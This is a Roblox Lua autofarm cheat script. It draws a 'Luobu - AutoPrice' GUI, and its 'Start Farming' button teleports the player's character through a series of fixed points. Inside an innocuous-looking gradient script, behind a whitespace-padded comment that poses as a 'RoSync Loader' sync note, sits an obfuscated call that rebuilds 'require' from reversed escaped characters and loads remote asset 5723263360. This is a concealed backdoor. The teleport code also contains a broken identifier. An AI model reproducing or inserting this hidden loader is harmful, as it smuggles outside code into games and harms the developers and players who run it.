-- luobu autofarm

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local Frame_2 = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local TextButton_Roundify_12px = Instance.new("ImageLabel")
local TextButton = Instance.new("TextButton")
local UIGradient_2 = Instance.new("UIGradient")
local UIGradient_3 = Instance.new("UIGradient")

--Properties:

ScreenGui.Parent = game.CoreGui

Frame.Name = "Frame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.33775422, 0, 0.33374235, 0)
Frame.Size = UDim2.new(0, 353, 0, 271)
Frame.Image = "rbxassetid://3570695787"
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.Active = true
Frame.Draggable = true

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.Position = UDim2.new(0.0198300295, 0, 0.0184501838, 0)
Frame_2.Size = UDim2.new(0, 338, 0, 261)
Frame_2.Image = "rbxassetid://3570695787"
Frame_2.ImageColor3 = Color3.fromRGB(55, 55, 55)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_2.SliceScale = 0.120

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0946745574, 0, 0.0344827585, 0)
TextLabel.Size = UDim2.new(0, 274, 0, 39)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "Luobu - AutoPrice"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(55, 55, 55))}
UIGradient.Parent = TextLabel

TextButton_Roundify_12px.Name = "TextButton_Roundify_12px"
TextButton_Roundify_12px.Parent = Frame_2
TextButton_Roundify_12px.Active = true
TextButton_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_Roundify_12px.BackgroundTransparency = 1.000
TextButton_Roundify_12px.Position = UDim2.new(0.498520702, 0, 0.586206913, 0)
TextButton_Roundify_12px.Selectable = true
TextButton_Roundify_12px.Size = UDim2.new(0.694178045, 0, 0.436781555, 0)
TextButton_Roundify_12px.Image = "rbxassetid://3570695787"
TextButton_Roundify_12px.ImageColor3 = Color3.fromRGB(66, 66, 66)
TextButton_Roundify_12px.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
TextButton_Roundify_12px.SliceScale = 0.120

TextButton.Parent = TextButton_Roundify_12px
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0213099513, 0, 0.0480943695, 0)
TextButton.Size = UDim2.new(0, 225, 0, 102)
TextButton.Font = Enum.Font.Gotham
TextButton.Text = "Start Farming"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
 local pos = Vector3.new(160.5, 7.65, 7.22498)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(245.245, 53.7665, 24.0262)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(137.45, 2.15, 232.375)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(-32.3999, 12.1426, -35.2273)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(475.05, 17.25, -7.22504)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(405.48, 9.80227, -262.886)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(163.8, 54.6, -181.003)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(223.45, 68.65, -318.575)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(417.65, -1.35, 184.775)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
wait(0.1)
local pos = Vector3.new(202.75, 1.76998, 135.725)

local ts = game:GetService('TweenService')

local plr = game.Players.LocalPlayer

local Char = plr.Character or plr.CharacterAddea:wait() 

local t = ts:create(Char.Humanoid.RootPart,TweenInfo.new(0 --[[ time ]]), {CFrame = CFrame.new(pos)}  )
t:Play()
end)

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 85, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 170, 255))}
UIGradient_2.Parent = TextButton

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 85, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 170, 255))}
UIGradient_3.Parent = Frame

-- Scripts:

local function NALHDUU_fake_script() -- UIGradient.LocalScript 
 local script = Instance.new('LocalScript', UIGradient)

 local speed = 0.6 -- Speed
 local gradient = script.Parent
 local rs = game:GetService("RunService")
 
 rs.RenderStepped:Connect(function(dt)
  gradient.Offset = Vector2.new(gradient.Offset.X + (speed*dt), 0)
  if gradient.Offset.X >= 1 then
   local isRotated = (gradient.Rotation == 180)
   gradient.Rotation = isRotated and 0 or 180; gradient.Offset = Vector2.new(-1, 0) --isRotated and -0.5 or -1
  end
 end)
end
coroutine.wrap(NALHDUU_fake_script)()
local function ZTBKE_fake_script() -- UIGradient. 
 local script = Instance.new('Script', UIGradient)

 
 --[[ Last synced 9/8/2021 07:00                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5723263360) --[[                                                                                                  ]]--
end
coroutine.wrap(ZTBKE_fake_script)()
local function WDRMNNS_fake_script() -- UIGradient_2.LocalScript 
 local script = Instance.new('LocalScript', UIGradient_2)

 local speed = 1 -- Speed
 local gradient = script.Parent
 local rs = game:GetService("RunService")
 
 rs.RenderStepped:Connect(function(dt)
  gradient.Offset = Vector2.new(gradient.Offset.X + (speed*dt), 0)
  if gradient.Offset.X >= 1 then
   local isRotated = (gradient.Rotation == 180)
   gradient.Rotation = isRotated and 0 or 180; gradient.Offset = Vector2.new(-1, 0) --isRotated and -0.5 or -1
  end
 end)
end
coroutine.wrap(WDRMNNS_fake_script)()
local function IAEJEZ_fake_script() -- UIGradient_3.LocalScript 
 local script = Instance.new('LocalScript', UIGradient_3)

 local speed = 1 -- Speed
 local gradient = script.Parent
 local rs = game:GetService("RunService")
 
 rs.RenderStepped:Connect(function(dt)
  gradient.Offset = Vector2.new(gradient.Offset.X + (speed*dt), 0)
  if gradient.Offset.X >= 1 then
   local isRotated = (gradient.Rotation == 180)
   gradient.Rotation = isRotated and 0 or 180; gradient.Offset = Vector2.new(-1, 0) --isRotated and -0.5 or -1
  end
 end)
end
coroutine.wrap(IAEJEZ_fake_script)()
local function VISYM_fake_script() -- Frame.LocalScript 
 local script = Instance.new('LocalScript', Frame)

 -- Draggble
 -- Credits: Veky
 
 local UserInputService = game:GetService("UserInputService")
 
 local gui = script.Parent
 
 local dragging
 local dragInput
 local dragStart
 local startPos
 
 local function update(input)
  local delta = input.Position - dragStart
  gui.Position = gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), 'Out', 'Linear', 0, true); -- drag speed
 end
 
 gui.InputBegan:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
   dragging = true
   dragStart = input.Position
   startPos = gui.Position
 
   input.Changed:Connect(function()
    if input.UserInputState == Enum.UserInputState.End then
     dragging = false
    end
   end)
  end
 end)
 
 gui.InputChanged:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
   dragInput = input
  end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
  if input == dragInput and dragging then
   update(input)
  end
 end)
end
coroutine.wrap(VISYM_fake_script)()